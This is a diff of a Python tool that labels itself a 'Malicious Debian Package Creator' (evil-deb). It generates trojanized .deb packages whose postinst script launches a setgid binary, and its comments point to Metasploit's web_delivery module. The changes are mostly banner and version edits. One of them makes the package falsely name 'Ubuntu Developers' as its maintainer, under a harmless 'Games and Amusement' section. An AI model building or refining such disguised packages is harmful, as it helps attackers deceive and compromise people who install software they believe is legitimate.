@@ -7,11 +7,11 @@
 #|  __)   ( (   ) )   | |   | |(_____)| |   | ||  __)   |  __ (  
 #| (       \ \_/ /    | |   | |       | |   ) || (      | (  \ \ 
 #| (____/\  \   /  ___) (___| (____/\ | (__/  )| (____/\| )___) )
-#(_______/   \_/   \_______/(_______/ (______/ (_______/|/ \___/ 0.6v.
+#(_______/   \_/   \_______/(_______/ (______/ (_______/|/ \___/ 1.0v.
 #                                                               
 #                         Malicious Debain Package Creator
 #                         WebSite :: http://www.haxkur.tk/
-#			     By: @Killerpop
+#			                               By: @Killerpop
 
 ##
 # Information :::
@@ -38,7 +38,7 @@
 #msf exploit(web_delivery) > show options
 #msf exploit(web_delivery) > exploit
 
-#Thanks for helping the project. Greetings from @Killerpop
+#Thanks for helping the project. By: @Killerpop
 
 ##
 
@@ -57,11 +57,11 @@ def printer():
 |  __)   ( (   ) )   | |   | |(_____)| |   | ||  __)   |  __ (  
 | (       \ \_/ /    | |   | |       | |   ) || (      | (  \ \ 
 | (____/\  \   /  ___) (___| (____/\ | (__/  )| (____/\| )___) )
-(_______/   \_/   \_______/(_______/ (______/ (_______/|/ \___/ 0.6v.
+(_______/   \_/   \_______/(_______/ (______/ (_______/|/ \___/ 1.0v.
                                                                
                          Malicious Debian Package Creator
                          WebSite :: http://www.haxkur.tk/
-			     By: @Killerpop
+			                               By: @Killerpop
 
 
   """
@@ -102,7 +102,7 @@ chmod 2755 /usr/local/bin/"""+h+""" && /usr/local/bin/"""+h+""" &
       o.close()
       os.system("chmod 0755 postinst")
       print ""
-      print "evil-deb finally done with it ;) happy Hacking !!"
+      print "evil-deb finally      ;) happy Hacking !!"
       print ""
   except IOError:
     print banner
@@ -123,8 +123,8 @@ Version: """+str(go.vers)+"""
 Section: Games and Amusement
 Priority: optional
 Architecture: """+uu+"""
-Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
-Description: evil-deb (Haxk.Ur development 2017)
+Maintainer: Ubuntu Developers (ubuntu@lists.ubuntu.com)
+Description: evil-deb By @Killerpop(Haxk.Ur development 2018)
 
 EOF
 
